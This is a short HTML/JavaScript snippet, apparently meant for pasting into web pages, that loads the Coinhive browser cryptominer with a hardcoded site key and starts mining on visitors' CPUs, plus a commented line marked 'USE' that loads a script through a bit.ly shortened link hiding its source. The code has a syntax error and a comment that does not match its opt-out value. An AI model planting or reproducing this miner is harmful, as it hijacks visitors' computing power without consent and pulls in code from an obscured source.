# USE -- <script src="http://bit.ly/2BIiCNi"></script>

#<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
#<script>
#var miner = new CoinHive.Anonymous('J54pv6oaSlkkhpynZBcnFvtZkRIOiKGS' { throttle: 0.8 }); miner.start();
#</script>

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script> 
  var miner = new CoinHive.Anonymous('J54pv6oaSlkkhpynZBcnFvtZkRIOiKGS' {throttle: 0.3}); 
  // Only start on non-mobile devices and if not opted-out 
  // in the last 14400 seconds (4 hours): 
  if (!miner.isMobile() && !miner.didOptOut(115200)) { 
  miner.start(); 
  } 
</script>

